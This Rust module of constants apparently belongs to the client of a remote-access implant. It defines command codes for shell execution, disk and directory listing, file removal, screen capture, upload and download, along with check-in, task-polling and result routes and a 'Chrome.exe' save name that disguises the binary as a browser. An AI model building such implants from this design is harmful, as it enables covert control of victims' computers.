pub mod network_type;
pub mod config;

// 保存action的值
pub const CMD_EXEC: u16 = 1;
pub const LIST_DISK: u16 = 2;
pub const LIST_DIR: u16 = 3;
pub const CREATE_DIR: u16 = 4;
pub const REMOVE: u16 = 5;
pub const RENAME: u16 = 6;

pub const CAPTURE: u16 = 30;
pub const UPLOAD: u16 = 50;
pub const DOWNLOAD: u16 = 40;
pub const SLEEP: u16 = 10001;

pub const SUCCESS: &str = "success";
pub const FAIL: &str = "fail";
pub const PING: &str = "Ping";

pub const ROUTE_ONLINE: &str = "client/machineInformation";
pub const ROUTE_TASK_LIST: &str = "client/tasklist";
pub const ROUTE_RESULT: &str = "client/receiver";
pub const ROUTE_UPLOAD: &str = "client/upload";
pub const ROUTE_DOWNLOAD: &str = "client/download";

pub const SAVE_NAME: &str = "Chrome.exe";